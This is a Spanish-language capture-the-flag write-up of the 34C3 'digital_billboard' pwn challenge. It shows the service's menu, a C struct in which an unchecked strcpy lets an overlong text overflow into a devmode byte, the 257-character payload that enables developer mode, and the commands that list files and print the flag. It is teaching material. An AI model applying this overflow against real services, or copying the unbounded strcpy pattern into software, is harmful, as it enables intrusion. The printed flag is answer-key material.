
**Título:** digital_billboard | **Categoría:** Pwn | **Nivel:** fácil

**Autor:** blondbyte

> **Enunciado:**
>
> We bought a new Digital Billboard for CTF advertisement:
>
> nc 35.198.185.193 1337
>
> [`billboard.tar.gz`](billboard.tar.gz)

---

#### Resolución
Accediendo al servicio que indica el enunciado me encuentro con:
```
root@blondbyte# nc 35.198.185.193 1337
*
* Digital Billboard
*
We bought a new digital billboard for CTF advertisement.

Type "help" for help :)
>
```
A ver la ayuda que dice:
```
> help
set_text <text>			(Set the text displayed on the board)
devmode 			(Developer mode)
help 				(Show this information)
modinfo 			(Show information about the loaded module)
>
```
Por lo visto hay varias opciones pero tampoco tengo claro por donde tirar. Vaya, hay un modo developer y algo más, a ver que dicen:
```
> devmode
Developer mode disabled!
> modinfo
************************************
Information about the loaded module:
Name: Digital Billboard
Base address: 0x7fb2fc896000
************************************
> set_text test
Successfully set text to: test
>
```
Hay una entrada de texto y lo primero que me viene a la cabeza son los ejercicios introductorios de overflow en binarios escritos en C.

Estaría bien activar ese modo developer. El chall se acompaña con el código fuente del servidor. Habrá algún checking para ser developer..y tanto que lo hay:
```c

struct billboard {
    char text[256];
    char devmode;
};

void set_text(int argc, char* argv[]) {
    strcpy(bb.text, argv[1]);
    printf("Successfully set text to: %s\n", bb.text);
    return;
}
```
La struct **billboard** reserva espacio para las variables de forma contigua. El método **strcpy(a,b)** almacena el valor de **b** en la dirección **a**. Vamos a preparar el payload, formado por una cadena de 256+1 chars para que haga overflow en la variable **text**:
```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
Inyectamos el payload:
```
> set_text aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Successfully set text to: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
> devmode
Developer access to billboard granted.
```
Parece que "estamos dentro". Muestro las ficheros del servidor e imprimo el que se llama flag.txt:
```
ls
billboard.so
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
server
srv
sys
tmp
usr
var
cat flag.txt
34C3_w3lc0me_t0_34c3_ctf_H4ve_fuN
```

La flag es: `34C3_w3lc0me_t0_34c3_ctf_H4ve_fuN`
